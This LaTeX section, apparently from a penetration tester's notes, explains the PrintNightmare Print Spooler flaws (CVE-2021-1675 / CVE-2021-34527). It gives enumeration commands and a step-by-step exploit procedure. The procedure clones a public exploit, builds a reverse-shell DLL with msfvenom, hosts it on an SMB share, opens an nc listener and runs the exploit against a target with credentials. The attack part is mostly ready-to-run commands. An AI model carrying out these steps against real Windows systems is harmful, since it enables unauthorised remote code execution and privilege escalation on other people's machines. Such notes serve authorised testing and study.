
\section{PrintNightmare}
\label{windows:printnightmare}

\subsection{Intro}
\href{https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare}{PrintNightmare} is the nickname given to two vulnerabilities (CVE-2021-34527 and
CVE-2021-1675) found in the
\href{https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc}{Print
Spooler service} that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. 


The main flaw that allows the RCE vulnerability is within the \verb+RpcAddPrinterDriverEx()+ call, which is part of the \verb+MS-RPRN+ protocol and allows remote driver installation by users with the \verb+SeLoadDriverPrivilege+ right. This right is granted by default only for members of the Administrators or Print Operators group. Unfortunately, \verb+RpcAddPrinterDriverEx()+ has a logical bug that allows users who are not part of the Administrators or Print Operators groups to bypass authorization and load drivers to the remote system.

cube0x0 has shawn that he was able to exploit the \verb+MS-PAR+ protocol too, using the \verb+RpcAsyncAddPrinterDriver()+ call which is similar to \verb+RpcAddPrinterDriverEx()+ and also allows loading drivers remotely to the target machine.

Although both the MS-RPRN and MS-PAR protocols are vulnerable to this exploit, MS-PAR requires less constrains for the exploitation to be successful.

\subsection{Enum}
\begin{verbatim}
rpcdump.py @<dc_ip> | egrep 'MS-RPRN|MS-PAR'
nxc smb <target_fqdn> -u <user> -p <password> -M printnightmare
nxc smb <target_fqdn> -u <user> -p <password> -M webdav
\end{verbatim}


\subsection{metasploit}
\verb+use exploit/windows/local/ricoh_driver_privesc+


\subsection{Exploit}
\begin{enumerate}
    \item \verb+git clone https://github.com/cube0x0/CVE-2021-1675.git+
    \item verify if \emph{Print System Asynchronous Protocol} and
\emph{Print System Remote Protocol} are exposed on the target.


    \item Craft a DLL reverse shell with msfvenom~\ref{tool:metasploit:msfvenom}
\begin{verbatim}
msfvenom -f dll -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -o <dll_name>
\end{verbatim}

    \item host the DLL shell with \verb+smbserver+~\ref{tool:impacket:smbserver}
\begin{verbatim}
smbserver.py -smb2support <name|jubeaz> ./
\end{verbatim}
    \item listener
\begin{verbatim}
nc -lvnp <port>
\end{verbatim}
 
    \item run the exploit: \href{https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare}{MS-RPRN abuse}, \href{https://github.com/cube0x0/CVE-2021-1675/blob/main/SharpPrintNightmare/CVE-2021-1675.py}{MS-PAR abuse}
\begin{verbatim}
sudo python3 CVE-2021-1675.py <domain_fqdn>/<user>:<password>@<target_ip> \
    '\\<ip>\<share_name>\<dll_name>'
\end{verbatim}
\end{enumerate}
